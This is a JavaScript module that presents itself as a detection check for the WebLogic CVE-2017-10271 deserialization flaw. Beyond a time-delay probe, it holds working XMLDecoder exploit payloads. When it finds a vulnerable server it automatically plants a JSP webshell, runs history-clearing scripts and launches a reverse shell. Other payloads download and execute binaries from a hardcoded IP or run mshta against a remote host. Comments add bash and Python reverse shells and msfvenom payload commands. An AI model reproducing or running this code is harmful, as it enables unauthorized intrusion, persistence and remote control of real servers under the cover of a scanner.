module.exports={
	tags:"weblogic,CVE-2017-10271,10271,3506",
	"ID":"030103",
	des:"CVE-2017-10271,weblogic CVE-2017-10271,CVE-2017-3506漏洞检测",
	VulApps:[
		"https://nvd.nist.gov/vuln/detail/CVE-2017-10271"],
	urls:[
		"https://nvd.nist.gov/vuln/detail/CVE-2017-10271",
    "https://github.com/Medicean/VulApps",
    "https://github.com/iBearcat/Oracle-WebLogic-CVE-2017-10271"],
	doCheck:function (url,fnCbk)
	{
  /*<!--
    <void class="org.apache.commons.ognl.Ognl">
        <object method="getValue">
          <string><![CDATA[(#response=@org.apache.struts2.ServletActionContext@getResponse()).(#response.addHeader('struts2','_struts2_'))]]></string>
          <object class="java.util.HashMap"></object>
        </object>
    </void>
    -->*/
		var _t = this,_s = this.self, szOld = url,
       // 后期完善，尝试对多个path进行测试
       aPath = '/wls-wsat/CoordinatorPortType,/wls-wsat/CoordinatorPortType11,/wls-wsat/ParticipantPortType,/wls-wsat/ParticipantPortType11,/wls-wsat/RegistrationPortTypeRPC,/wls-wsat/RegistrationPortTypeRPC11,/wls-wsat/RegistrationRequesterPortType,/wls-wsat/RegistrationRequesterPortType11'.split(',');
		var s = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
 <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
  <java class="java.beans.XMLDecoder">
    
		<void class="java.lang.Thread">
		  	<void method="sleep">
		  		<long>{num}</long>
		  	</void>
		</void>
    
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>

*/}),s1_ = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>/bin/bash</string>
              </void>
              <void index="1">
                <string>-c</string>
              </void>
              <void index="2">
                <string><![CDATA[{code}]]></string>
              </void>
            </array>
          <void method="start"/></void>
        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
*/}),s2 = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>/bin/bash</string>
              </void>
              <void index="1">
                <string>-c</string>
              </void>
              <void index="2">
                <string><![CDATA[x=linuxRvsTcp123.elf; wget --header="User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" http://23.105.209.65/${x}; chmod +x ${x}; ./${x} &]]></string>
              </void>
            </array>
          <void method="start"/></void>
        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
*/}),s3 = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>/bin/bash</string>
              </void>
              <void index="1">
                <string>-c</string>
              </void>
              <void index="2">
                <string><![CDATA[>/tmp/2188029.socks]]></string>
              </void>
            </array>
          <void method="start"/></void>
        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
*/}),s3o = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <void id="runOut" class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>/bin/bash</string>
              </void>
              <void index="1">
                <string>-c</string>
              </void>
              <void index="2">
                <string><![CDATA[d>/tmp/2188029.socks]]></string>
              </void>
            </array>
          <void method="start"/></void>
          <string id="innerValue">
            xx
          </string>
          <string id="response">
    A simpler way to get a value :)    &lt;br/&gt;
    with "<object idref="runOut"/>"   &lt;br/&gt;
    and "<object idref="innerValue"/>  &lt;br/&gt;
  </string>
  <object class="org.restlet.Response" method="getCurrent"> 
    <void method ="setEntity">
      <object idref = "response"/>
      <object class = "org.restlet.data.MediaType" field="TEXT_HTML"></object>
    </void>
  </object>
        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
*/})
,s3_1 = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>/bin/bash</string>
              </void>
              <void index="1">
                <string>-c</string>
              </void>
              <void index="2">
                <string><![CDATA[find / -name ".X11.jsp"|xargs -I {} cp -f /tmp/2188029.socks {}]]></string>
              </void>
            </array>
          <void method="start"/></void>
        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
*/}),s4 = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>cmd.exe</string>
              </void>
              <void index="1">
                <string>/c</string>
              </void>
              <void index="2">
                <string><![CDATA[mshta http://hk-7.tk/1.jpg]]></string>
                <!--
                <string><![CDATA['del poc.vbs& del mess.exe& @echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://23.105.209.65/Lover1234_65.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs']]></string>
                -->
              </void>
            </array>
          <void method="start"/></void>
        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
*/}),s5 = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
  <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java version="1.8.0_131" class="java.beans.XMLDecoder">
        <object class="java.io.PrintWriter">
            <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/.X11.jsp</string><void method="println">
              <string><![CDATA[{code}]]></string></void><void method="close"/>
        </object>
    </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>

*/});
// 
// bash -i >& /dev/tcp/23.105.209.65/9999 0>&1
// python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("23.105.209.65",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

// msfvenom -p linux/x64/meterpreter/reverse_tcp LPORT=12345 LHOST=23.105.209.65 -f elf  -o ./linuxRvsTcp123.elf
// msfvenom -a x86 --platform linux -p  payload/linux/x86/shell/reverse_tcp LPORT=1234 LHOST=23.105.209.65  -e x86/shikata_ga_nai -b '\x00' -i 8 -f elf -o linuxRvsTcp123.elf
// x=linuxRvsTcp123.elf; wget --header="User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" http://23.105.209.65/${x}; chmod +x ${x}; ./${x} &

		var nNum = new Date().getTime()/1000,nTime = 0;
		// s = s.replace(/\{num\}/gmi, nTime).replace(/>\s*</gmi,'><').replace(/[\t\r]/gmi,'');
		// 打开注释，测试存在漏洞的情况下，防火墙有没有限制主动向外连接
		// s = s5;
    var hst = _s.parseUrl(url);
    // console.log(s);

    // console.log(hst);
    var fnTmp1 = function(p11,szPld,fnTmpCbk,szTUrl)
        {
           s = szPld||s;
           nNum = new Date().getTime()/1000,nTime = 0;
           nTime = (parseInt(Math.random() * 1000000000)%18 + 15) * 1000;
           s = s.replace(/\{num\}/gmi, nTime).replace(/>\s*</gmi,'><').replace(/[\t\r]/gmi,'');
           var url1 = szOld.substr(0, szOld.indexOf('/',13));
           url = url1 + p11;// '/wls-wsat/CoordinatorPortType'
          // console.log(url);
          var oOpt = _s.fnOptHeader({
            method: 'POST',
            uri: url,
            body:szPld||s
              ,headers:
              {
                "Host":hst.host,
                "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
                "Accept-Encoding":"zh-CN,zh",
                "content-type":"text/xml;charset=UTF-8"
              }});
          oOpt.timeout = nTime + 5000;
          _s.request(oOpt
            , function (error, response, body)
            {
              if(fnTmpCbk){fnTmpCbk(body,response,error,url1 + szTUrl);return;}
              _s.error(error);
              body = body || String(error);
              if(-1 < String(body).indexOf("Invalid attribute for element void:class"))
              {
                _s.log("没有发现WebLogic CVE-2017-10271 反序列化，response.statusCode：" + (response && response.statusCode||body));

                return;
              }
              var nT = new Date().getTime()/1000 - nNum,nT2 = nTime / 1000 - 5;
              // console.log(String(body));
              // console.log([nT,nT2]);

              // console.log(response.headers);
              // console.log(body);
              
              if(nT >= nT2 && -1 < String(body).indexOf("<faultstring>0</faultstring>"))
              {
                var r = {vul:true,"body":String(body),href:response.request.uri.href,"url":szOld,"send":s,"des":
                  "发现高危漏洞 WebLogic CVE-2017-10271 反序列化, 延时" + (nTime/1000) + "秒，实际返回耗时：" + nT + "秒",
                  statusCode:(response && response.statusCode||0)};
                  // X-Powered-By,Set-Cookie,Date
                  // X-Pad: avoid browser bug
                // console.log(r);
                if(r.vul)
                {
                   if(s == s1_||global.X11){s1_ = null;return}// 确保只执行一次
                   else if(s != s1_ && s1_)
                   {
                       global.X11=true;
                       // 验证
                       var szRk = "Geo" + "rg sa" + "ys, 'A"+"ll se"+"ems f"+"ine",fCbk = function(b,r,e,u)
                       {
                           _s.request.get(u,function(e,r,b)
                          {
                             b = String(b);
                             if(-1 < b.indexOf(szRk))
                             {
                                b = b.replace(/<[^>]+>/gmi,'').replace(/(^\s*)|(\s*$)/gmi,'');
                                console.log("Ok: " + u);
                                if(b)console.log(b);
                             }
                          });
                       };
                       // all linux ok:
                       var sTmp1 = Buffer.from(_s.fs.readFileSync("payload/clearHis.sh").toString("utf-8") + _s.fs.readFileSync("payload/linuxShellX11.sh").toString("utf-8")+ _s.fs.readFileSync("payload/end.sh").toString("utf-8")).toString("base64").replace(/[\r\n]/gmi,'');
                       // 处理、解决bash -c 不支持变量的问题
                       var szTmpFN = "./._t_",s1_1 = _s.formatPayload(s1_, "echo " + sTmp1 + "|base64 -d>" + szTmpFN + ";chmod +x " + szTmpFN + ";" + szTmpFN + ";rm " + szTmpFN);
                       
                       fnTmp1(aPath[0],s = s1_1,fCbk,"/wls-wsat/.X11.jsp");

                       // win is ok: /bea_wls_internal/.X11.jsp?ls=netstat -ant
                       s5 = _s.formatPayload(s5, "payload/x.jsp");
                       fnTmp1(aPath[0],s = s5,fCbk,'/bea_wls_internal/.X11.jsp?ls=netstat -ant');

                       // uddiexplorer
                       fnTmp1(aPath[0],s = s5,fCbk,'/uddiexplorer/.X11.jsp?ls=ps -ef');
                       fnTmp1(aPath[0],s = s5,fCbk,'/uddi/.X11.jsp?ls=ifconfig');
                       fnTmp1(aPath[0],s = s5,fCbk,'/consoleapp/.X11.jsp?ls=ifconfig');
                       
                       fnTmp1(aPath[0],s = s5,fCbk,'/console/.X11.jsp?ls=whoami');

                       // linux反弹shell
                       s1_1 = _s.formatPayload(s1_, "payload/linuxPyReverse.sh");
                       // console.log(s1_1);
                       fnTmp1(aPath[0],s = s1_1);
                   }
                }
                fnCbk(r,_t);
              }
              else _s.log("没有发现WebLogic CVE-2017-10271 反序列化，response.statusCode：" + (response && response.statusCode||body));
              //console.log(body);
             }
           );
        };
    for(var i = 0; i < aPath.length; i++)
    {
      fnTmp1(aPath[i]);
    }
	}
};